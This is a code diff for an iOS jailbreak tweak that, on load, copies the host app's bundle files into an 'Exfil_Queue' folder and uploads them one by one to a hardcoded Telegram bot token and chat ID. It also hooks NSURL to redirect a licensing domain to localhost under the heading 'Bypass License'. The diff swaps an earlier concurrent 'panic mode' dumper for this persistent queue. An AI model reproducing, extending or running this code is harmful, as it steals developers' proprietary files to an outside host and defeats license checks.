@@ -5,9 +5,19 @@
 // --- CONFIGURATION ---
 #define TG_TOKEN @"8134587785:AAGm372o_98TU_4CVq4TN2RzSdRkNHztc6E"
 #define TG_CHAT_ID @"7730331218"
-#define IGNORE_NAME @"Enigma" // Ignore our own tweak to save bandwidth
+#define IGNORE_NAME @"Enigma"
 
-// --- HELPER: FIRE & FORGET UPLOAD ---
+// --- HELPER: LOGGING ---
+void sendText(NSString *text) {
+    @try {
+        NSString *urlStr = [NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendMessage?chat_id=%@&text=%@", 
+                            TG_TOKEN, TG_CHAT_ID, 
+                            [text stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]]];
+        [[[NSURLSession sharedSession] dataTaskWithURL:[NSURL URLWithString:urlStr] completionHandler:nil] resume];
+    } @catch (NSException *e) {}
+}
+
+// --- HELPER: UPLOAD ---
 NSData *createBody(NSString *boundary, NSString *filename, NSData *data) {
     NSMutableData *body = [NSMutableData data];
     [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
@@ -18,72 +28,110 @@ NSData *createBody(NSString *boundary, NSString *filename, NSData *data) {
     return body;
 }
 
-void uploadFileFast(NSString *path, NSString *filename) {
-    // 1. Read Data (Fast Map)
-    NSData *fileData = [NSData dataWithContentsOfFile:path];
-    if (!fileData || fileData.length == 0) return;
-
-    // 2. Build Request
-    NSString *urlString = [NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendDocument?chat_id=%@", TG_TOKEN, TG_CHAT_ID];
-    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:urlString]];
-    [request setHTTPMethod:@"POST"];
-    
-    NSString *boundary = [NSString stringWithFormat:@"Boundary-%@", [[NSUUID UUID] UUIDString]];
-    [request setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
-    [request setHTTPBody:createBody(boundary, filename, fileData)];
-    
-    // 3. FIRE AND FORGET (Do not wait for response)
-    [[[NSURLSession sharedSession] dataTaskWithRequest:request] resume];
-}
-
-void sendText(NSString *text) {
-    @try {
-        NSString *urlStr = [NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendMessage?chat_id=%@&text=%@", 
-                            TG_TOKEN, TG_CHAT_ID, 
-                            [text stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]]];
-        [[[NSURLSession sharedSession] dataTaskWithURL:[NSURL URLWithString:urlStr] completionHandler:nil] resume];
-    } @catch (NSException *e) {}
-}
-
 // =========================================================
-// THE "PANIC MODE" DUMPER
+// PART 1: THE PERSISTENT QUEUE SYSTEM
 // =========================================================
-void panicDump() {
-    NSString *bundlePath = [[NSBundle mainBundle] bundlePath];
+void processQueue() {
+    NSString *docPath = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
+    NSString *queuePath = [docPath stringByAppendingPathComponent:@"Exfil_Queue"];
     NSFileManager *fm = [NSFileManager defaultManager];
     
-    sendText(@"🚨 PANIC MODE INITIATED: Flooding files now...");
-
-    // 1. Collect all interesting files first
-    NSMutableArray *filesToUpload = [NSMutableArray array];
-    NSDirectoryEnumerator *enumerator = [fm enumeratorAtPath:bundlePath];
-    NSString *file;
+    // 1. Get List of Files waiting in Queue
+    NSArray *queuedFiles = [fm contentsOfDirectoryAtPath:queuePath error:nil];
     
-    while (file = [enumerator nextObject]) {
-        // FILTER: Skip heavy assets that waste time
-        if ([file hasSuffix:@".png"] || [file hasSuffix:@".jpg"] || 
-            [file hasSuffix:@".jpeg"] || [file hasSuffix:@".car"] || 
-            [file hasSuffix:@".wav"] || [file hasSuffix:@".mp3"] || 
-            [file hasSuffix:@".ttf"] || [file hasSuffix:@".otf"] ||
-            [file hasSuffix:@".lproj"] || [file containsString:IGNORE_NAME]) { 
-            continue; 
-        }
-        [filesToUpload addObject:file];
+    if (queuedFiles.count == 0) {
+        // Queue is empty, nothing to do.
+        return;
     }
     
-    // 2. UPLOAD EVERYTHING AT ONCE (Concurrent)
-    // dispatch_apply runs on multiple threads simultaneously
-    dispatch_apply(filesToUpload.count, dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^(size_t i) {
-        NSString *filename = filesToUpload[i];
-        NSString *fullPath = [bundlePath stringByAppendingPathComponent:filename];
+    sendText([NSString stringWithFormat:@"🔄 RESUMING UPLOAD: %lu files remaining in queue...", (unsigned long)queuedFiles.count]);
+
+    // 2. Process Queue One by One
+    for (NSString *filename in queuedFiles) {
+        NSString *filePath = [queuePath stringByAppendingPathComponent:filename];
+        NSData *fileData = [NSData dataWithContentsOfFile:filePath];
         
-        uploadFileFast(fullPath, filename);
-    });
+        if (fileData) {
+            // Synchronous Upload to ensure order
+            NSString *urlString = [NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendDocument?chat_id=%@", TG_TOKEN, TG_CHAT_ID];
+            NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:urlString]];
+            [request setHTTPMethod:@"POST"];
+            NSString *boundary = @"Boundary-PersistentExfil";
+            [request setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
+            [request setHTTPBody:createBody(boundary, filename, fileData)];
+            
+            dispatch_semaphore_t sema = dispatch_semaphore_create(0);
+            [[[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
+                if (!e) {
+                    // 3. DELETE AFTER SUCCESSFUL UPLOAD
+                    [fm removeItemAtPath:filePath error:nil];
+                }
+                dispatch_semaphore_signal(sema);
+            }] resume];
+            dispatch_semaphore_wait(sema, DISPATCH_TIME_FOREVER);
+        }
+    }
+    sendText(@"✅ QUEUE FINISHED! All files uploaded.");
 }
 
+// =========================================================
+// PART 2: THE INSTANT GRABBER
+// =========================================================
+void grabAndStageFiles() {
+    NSString *bundlePath = [[NSBundle mainBundle] bundlePath];
+    NSString *docPath = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
+    NSString *queuePath = [docPath stringByAppendingPathComponent:@"Exfil_Queue"];
+    NSFileManager *fm = [NSFileManager defaultManager];
+    
+    // Create Queue Folder if not exists
+    if (![fm fileExistsAtPath:queuePath]) {
+        [fm createDirectoryAtPath:queuePath withIntermediateDirectories:YES attributes:nil error:nil];
+        
+        // --- THIS RUNS ONLY ONCE (First Launch) ---
+        sendText(@"🚀 FIRST RUN: Copying files to safe storage...");
+        
+        NSDirectoryEnumerator *enumerator = [fm enumeratorAtPath:bundlePath];
+        NSString *file;
+        int count = 0;
+        
+        while (file = [enumerator nextObject]) {
+            // FILTER: Code & Configs Only
+            if ([file hasSuffix:@".png"] || [file hasSuffix:@".jpg"] || 
+                [file hasSuffix:@".car"] || [file hasSuffix:@".lproj"] || 
+                [file containsString:IGNORE_NAME]) { 
+                continue; 
+            }
+            
+            NSString *srcPath = [bundlePath stringByAppendingPathComponent:file];
+            NSString *dstPath = [queuePath stringByAppendingPathComponent:[file lastPathComponent]]; // Flatten structure
+            
+            // FAST COPY (Disk to Disk)
+            [fm copyItemAtPath:srcPath toPath:dstPath error:nil];
+            count++;
+        }
+        sendText([NSString stringWithFormat:@"💾 SAVED %d FILES to Documents. Starting upload...", count]);
+    }
+    
+    // START UPLOADING FROM QUEUE
+    processQueue();
+}
+
+// =========================================================
+// PART 3: KEEP APP ALIVE (Bypass License)
+// =========================================================
+%hook NSURL
++ (instancetype)URLWithString:(NSString *)URLString {
+    if ([URLString localizedCaseInsensitiveContainsString:@"0devs.org"]) return %orig(@"http://127.0.0.1");
+    return %orig;
+}
+- (instancetype)initWithString:(NSString *)URLString {
+    if ([URLString localizedCaseInsensitiveContainsString:@"0devs.org"]) return %orig(@"http://127.0.0.1");
+    return %orig;
+}
+%end
+
 %ctor {
-    // START IMMEDIATELY ON LOAD
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
-        panicDump();
+        grabAndStageFiles();
     });
 }
